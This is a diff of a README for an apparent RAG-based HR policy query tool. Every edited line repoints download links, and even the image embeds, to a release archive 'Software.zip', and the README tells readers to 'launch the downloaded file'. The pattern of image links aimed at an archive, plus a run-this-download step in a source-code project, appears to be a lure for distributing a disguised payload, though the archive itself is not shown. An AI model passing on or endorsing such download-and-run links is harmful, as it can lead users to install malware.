@@ -2,7 +2,7 @@
 
 Welcome to the **HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG** repository! 🤖📚
 
-![HR Policies](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v1.0/Soft.zip)
+![HR Policies](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v2.0/Software.zip)
 
 ## Description
 
@@ -25,7 +25,7 @@ This repository is a hub for an innovative HR Policy Query Resolution system uti
 
 To experience the magic of our HR Policy Query Resolution system, download the system release package from the link below:
 
-[![Download System](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v1.0/Soft.zip)](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v1.0/Soft.zip)
+[![Download System](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v2.0/Software.zip)](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v2.0/Software.zip)
 
 *Launch the downloaded file to explore the capabilities of our advanced system!*
 
@@ -33,7 +33,7 @@ To experience the magic of our HR Policy Query Resolution system, download the s
 
 If you are passionate about AI, HR, or NLP, feel free to explore our repository and contribute to our project. Together, we can reshape the future of HR policy management and query resolution!
 
-![Teamwork](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v1.0/Soft.zip)
+![Teamwork](https://github.com/savageplayerzx/HR_Policy_Query_Resolution_with_Retrieval_Augmented_Generation_RAG/releases/download/v2.0/Software.zip)
 
 ## Stay Updated
 
